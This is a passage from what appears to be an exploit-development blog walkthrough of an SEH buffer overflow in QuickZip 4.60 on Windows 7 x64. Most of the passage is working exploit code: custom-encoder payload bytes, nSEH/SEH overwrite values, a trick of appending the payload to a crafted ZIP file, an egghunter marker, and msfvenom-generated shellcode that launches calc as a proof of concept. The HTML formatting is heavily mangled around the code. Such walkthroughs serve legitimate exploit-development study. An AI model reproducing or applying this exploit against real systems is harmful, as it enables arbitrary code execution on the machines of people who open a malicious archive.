</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x54</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push esp;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x58</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x33</span>\<span class="n">x07</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x01010733</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2d</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># sub eax, 0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop esp;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Write</span> <span class="n">instructions</span> <span class="k">for</span><span class="p">:</span> <span class="n">push</span> <span class="n">esp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">eax</span><span class="p">;</span> <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xDEADBEEF</span><span class="p">;</span> <span class="n">jmp</span> <span class="n">eax</span><span class="p">;</span> <span class="n">jnz</span> <span class="mh">0xee</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xee7590e0 into EAX  ==&gt;&gt; &amp;lsquo;0xee75&amp;rsquo; represents &amp;lsquo;JNZ $-16&amp;rsquo; instruction</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x74</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77747070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x20</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77012070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xffdeadbe into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x77</span>\<span class="n">x77</span>\<span class="n">x77</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77777777</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x37</span>\<span class="n">x25</span>\<span class="n">x57</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77572537</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x11</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x11101110</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xef2d5854 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x43</span>\<span class="n">x47</span>\<span class="n">x1c</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x771c4743</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77011010</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x10</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x01100101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>       <span class="c"># padding for the rest of the encoder&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x71</span>\<span class="n">x9b</span>\<span class="n">x70</span>\<span class="n">x9b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>       <span class="c"># nSEH: jno $-99; jo $-99   =&gt; &amp;lsquo;9b&amp;rsquo; will actually be converted to &amp;lsquo;a2&amp;rsquo;, which is $-92</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>       <span class="c"># SEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="n">snip</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Once we execute it, the following should happen:</p>

<ol>
<li>Crash is triggered</li>
<li><em>POP-POP-RET</em> instructions are called</li>
<li>Backwards jump <code>JNO $-92</code> is taken</li>
<li>Execution of custom encoder starts</li>
<li>The code will eventually reach <code>JNO</code> instruction from step 3</li>
<li><code>JNO</code> jump is taken again, but this time, the first instruction we land at is the newly written jump back by <strong>16</strong> bytes</li>
<li>Jump is taken</li>
<li>Instructions written using the custom encoder will execute</li>
</ol>


<p>Let&rsquo;s see if that&rsquo;s what really happens.</p>

<ul>
<li><p>After execution of custom encoder: *
<a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/22.jump%20taken%201.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/22.jump%20taken%201.png" alt="image" /></a></p></li>
<li><p><code>JMP</code> is taken *
<a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/23.jump%20taken%202.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/23.jump%20taken%202.png" alt="image" /></a></p></li>
<li><p>Landed before written instructions, ready to execute *
<a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/24.jump%20taken%203.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/24.jump%20taken%203.png" alt="image" /></a></p></li>
</ul>


<p>Awesome, exactly what we expected! Now we just need to figure out what value to replace <code>0xDEADBEEF</code> with and we&rsquo;re pretty much done!</p>

<p>Let&rsquo;s calculate it - current value of <code>ESP</code> is <code>0x0018FB4E</code> and our egghunter code starts at <code>0x0018FA90</code>, this means that we need to offset EAX by <code>0xBE</code> to have <code>EAX</code> pointing where we need it to.</p>

<p>Let&rsquo;s modify our exploit to instead of subtracting <code>0xDEADBEEF</code> from <code>EAX</code>, we&rsquo;ll only take away <code>0xBE</code>. The following changes should be made to the PoC:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>                                # Zero-out EAX
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>payload += &ldquo;\x25\x01\x01\x01\x01&rdquo;   # and eax,0x01010101
</span><span class='line'>payload += &ldquo;\x25\x10\x10\x10\x10&rdquo;   # and eax,0x10101010
</span><span class='line'>                                       # write 0xff000000 into EAX
</span><span class='line'>payload += &ldquo;\x05\x01\x01\x01\x77&rdquo;   # add eax, 0x77010101
</span><span class='line'>payload += &ldquo;\x05\x01\x01\x01\x77&rdquo;   # add eax, 0x77010101
</span><span class='line'>payload += &ldquo;\x05\x10\x10\x10\x22&rdquo;   # add eax, 0x22101010
</span><span class='line'>payload += &ldquo;\x2d\x12\x12\x12\x11&rdquo;   # sub eax, 0x11121212
</span><span class='line'>payload += &ldquo;\x50&rdquo;                   # push eax;
</span><span class='line'>                                    # Zero-out EAX
</span><span class='line'>payload += &ldquo;\x25\x01\x01\x01\x01&rdquo;   # and eax,0x01010101
</span><span class='line'>payload += &ldquo;\x25\x10\x10\x10\x10&rdquo;   # and eax,0x10101010
</span><span class='line'>                                       # write 0xbe2d5854 into EAX
</span><span class='line'>payload += &ldquo;\x05\x43\x47\x1c\x67&rdquo;   # add eax, 0x671c4743
</span><span class='line'>payload += &ldquo;\x05\x11\x11\x11\x57&rdquo;   # add eax, 0x57111111
</span><span class='line'>payload += &ldquo;\x50&rdquo;                   # push eax;</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s run it and see where it gets us.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/28.beginning%20of%20the%20egghunter.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/28.beginning%20of%20the%20egghunter.png" alt="image" /></a></p>

<p>AWESOME! We landed in our egghunter. Now it should be as easy as inserting shellcode of our choice and letting egghunter find it.</p>

<p>Let&rsquo;s run <code>!mona findmsp</code> just in case to see if our payload is still there in memory&hellip;</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/29.no%20payload.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/29.no%20payload.png" alt="image" /></a></p>

<p>What?! It disappeared! Where did it go? What happened? All that work for nothing????</p>

<p><strong><em> fast-forward a couple of hours </em></strong></p>

<p>Ok, I know what happens. The instruction we added at the very beginning of our custom encoding routine breaks the payload and makes our shellcode disappear. Instruction at fault is <code>POP ESP</code> (<code>\x5c</code>) - the same byte from before that made our filename to be interpreted as a directory!</p>

<p>I spent a lot of time thinking, debugging and trying to come up with an alternative that doesn&rsquo;t break the payload, but with no luck. We simply don&rsquo;t have anything we could use in this case that uses valid character set.</p>

<p>However, there is a solution! Maybe not the prettiest, but there is. Have a look at the following line in our exploit:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>What if we add payload once again after the header_3? It&rsquo;ll basically append some garbage at the end of the ZIP file, but it should still work. Let&rsquo;s give it a shot!</p>

<p>Modify the line as follows and open it us with QuickZip.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span> <span class="o">+</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/30.quickzip%20warning.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/30.quickzip%20warning.png" alt="image" /></a></p>

<p>There&rsquo;s a warning displayed that there&rsquo;s some garbage at the end of the file, but that&rsquo;s OK, it appears that we can still successfully open the file.</p>

<p>Let&rsquo;s trigger the crash and see once again if, this time, we can find the pattern in memory.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/31.%20shellcode%20found%20again.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/31.%20shellcode%20found%20again.png" alt="image" /></a></p>

<p>Hurray!!! It&rsquo;s there!!! Now it should be all nice and easy.</p>

<h2>Shellcode</h2>

<p>Now we just need to follow the usual process of setting up the payload for shellcode - we need to figure out bad characters, insert an &ldquo;egg&rdquo; (<code>w00tw00t</code>) before the shellcode and align the stack.</p>

<p>I won&rsquo;t go into the details of finding bad characters as I already covered it in details <a href="http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/">here</a>. Luckily for us, the only bad characters for this part of payload are <code>\x00</code>, <code>\x0a</code> and <code>\x0d</code>.</p>

<p>We also need to insert <code>w00tw00t</code> characters at the very beginning of our shellcode to ensure that the egghunter can locate it and redirect execution to first instructions after the &ldquo;egg&rdquo;.</p>

<p>Lastly, we&rsquo;ll need to align the stack to make sure <code>ESP</code> points to an address which is a multiple of 16 bytes. The reason for this is that there are some &ldquo;<a href="https://en.wikipedia.org/wiki/SIMD">SIMD</a>&rdquo; (Single Instruction, Multiple Data) instructions which can perform parallel operations on multiple words in memory, but require those multiple words to be a block starting at an address which is a multiple of 16 bytes.</p>

<p>If we didn&rsquo;t align the stack properly, the shellcode simply wouldn&rsquo;t work. We can easily align the stack with a single instruction
<code>AND esp,0xFFFFFFF0</code>, which we&rsquo;ll add right behind the <code>w00tw00t</code> egg and before the actual shellcode.</p>

<p>For PoC, we&rsquo;ll use <code>msfvenom</code> to generate a simple, <code>calc</code> popping shellcode. To sum it all up, the shellcode code will look as follows:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">w00tw00t</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                     <span class="c"># egg</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x81</span>\<span class="n">xe4</span>\<span class="n">xf0</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c"># align the stack: AND esp,0xFFFFFFF0&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="k">exec</span> <span class="n">CMD</span><span class="o">=</span><span class="n">calc</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">b</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x0a</span>\<span class="n">x0d</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">227</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xbf</span>\<span class="n">xdc</span>\<span class="n">xae</span>\<span class="n">x26</span>\<span class="n">x3d</span>\<span class="n">xda</span>\<span class="n">xdd</span>\<span class="n">xd9</span>\<span class="n">x74</span>\<span class="n">x24</span>\<span class="n">xf4</span>\<span class="n">x5b</span>\<span class="n">x31</span>\<span class="n">xc9</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb1</span>\<span class="n">x33</span>\<span class="n">x31</span>\<span class="n">x7b</span>\<span class="n">x12</span>\<span class="n">x03</span>\<span class="n">x7b</span>\<span class="n">x12</span>\<span class="n">x83</span>\<span class="n">x37</span>\<span class="n">x52</span>\<span class="n">xc4</span>\<span class="n">xc8</span>\<span class="n">x3b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x43</span>\<span class="n">x80</span>\<span class="n">x33</span>\<span class="n">xc3</span>\<span class="n">x94</span>\<span class="n">xf3</span>\<span class="n">xba</span>\<span class="n">x26</span>\<span class="n">xa5</span>\<span class="n">x21</span>\<span class="n">xd8</span>\<span class="n">x23</span>\<span class="n">x94</span>\<span class="n">xf5</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xaa</span>\<span class="n">x61</span>\<span class="n">x15</span>\<span class="n">x7d</span>\<span class="n">xfe</span>\<span class="n">x91</span>\<span class="n">xae</span>\<span class="n">xf3</span>\<span class="n">xd7</span>\<span class="n">x96</span>\<span class="n">x07</span>\<span class="n">xb9</span>\<span class="n">x01</span>\<span class="n">x99</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x98</span>\<span class="n">x0f</span>\<span class="n">x8e</span>\<span class="n">x75</span>\<span class="n">x5a</span>\<span class="n">x11</span>\<span class="n">x72</span>\<span class="n">x87</span>\<span class="n">x8f</span>\<span class="n">xf1</span>\<span class="n">x4b</span>\<span class="n">x48</span>\<span class="n">xc2</span>\<span class="n">xf0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x8c</span>\<span class="n">xb4</span>\<span class="n">x2d</span>\<span class="n">xa0</span>\<span class="n">x45</span>\<span class="n">xb3</span>\<span class="n">x9c</span>\<span class="n">x55</span>\<span class="n">xe1</span>\<span class="n">x81</span>\<span class="n">x1c</span>\<span class="n">x57</span>\<span class="n">x25</span>\<span class="n">x8e</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x1d</span>\<span class="n">x2f</span>\<span class="n">x40</span>\<span class="n">x50</span>\<span class="n">xe9</span>\<span class="n">x85</span>\<span class="n">x4b</span>\<span class="n">x80</span>\<span class="n">x42</span>\<span class="n">x91</span>\<span class="n">x04</span>\<span class="n">x38</span>\<span class="n">xe8</span>\<span class="n">xfd</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb4</span>\<span class="n">x39</span>\<span class="n">x3d</span>\<span class="n">x1e</span>\<span class="n">x88</span>\<span class="n">x70</span>\<span class="n">x4a</span>\<span class="n">xd5</span>\<span class="n">x7a</span>\<span class="n">x83</span>\<span class="n">x9a</span>\<span class="n">x27</span>\<span class="n">x82</span>\<span class="n">xb2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xe2</span>\<span class="n">xe4</span>\<span class="n">xbd</span>\<span class="n">x7b</span>\<span class="n">xef</span>\<span class="n">xf5</span>\<span class="n">xfa</span>\<span class="n">xbb</span>\<span class="n">x10</span>\<span class="n">x80</span>\<span class="n">xf0</span>\<span class="n">xb8</span>\<span class="n">xad</span>\<span class="n">x93</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc2</span>\<span class="n">xc3</span>\<span class="n">x69</span>\<span class="n">x11</span>\<span class="n">xd7</span>\<span class="n">x63</span>\<span class="n">xf9</span>\<span class="n">x81</span>\<span class="n">x33</span>\<span class="n">x92</span>\<span class="n">x2e</span>\<span class="n">x57</span>\<span class="n">xb7</span>\<span class="n">x98</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x9b</span>\<span class="n">x13</span>\<span class="n">x9f</span>\<span class="n">xbc</span>\<span class="n">x1a</span>\<span class="n">xf7</span>\<span class="n">xab</span>\<span class="n">xb8</span>\<span class="n">x97</span>\<span class="n">xf6</span>\<span class="n">x7b</span>\<span class="n">x49</span>\<span class="n">xe3</span>\<span class="n">xdc</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5f</span>\<span class="n">x12</span>\<span class="n">xb7</span>\<span class="n">x7d</span>\<span class="n">xf9</span>\<span class="n">xfe</span>\<span class="n">x16</span>\<span class="n">x81</span>\<span class="n">x19</span>\<span class="n">xa6</span>\<span class="n">xc7</span>\<span class="n">x27</span>\<span class="n">x51</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x13</span>\<span class="n">x51</span>\<span class="n">x38</span>\<span class="n">x02</span>\<span class="n">xe2</span>\<span class="n">xd3</span>\<span class="n">x46</span>\<span class="n">x6b</span>\<span class="n">xe4</span>\<span class="n">xeb</span>\<span class="n">x48</span>\<span class="n">xdb</span>\<span class="n">x8d</span>\<span class="n">xda</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc3</span>\<span class="n">xb4</span>\<span class="n">xca</span>\<span class="n">xe2</span>\<span class="n">x01</span>\<span class="n">xf1</span>\<span class="n">x25</span>\<span class="n">xa9</span>\<span class="n">x08</span>\<span class="n">x53</span>\<span class="n">xae</span>\<span class="n">x74</span>\<span class="n">xd9</span>\<span class="n">xe6</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
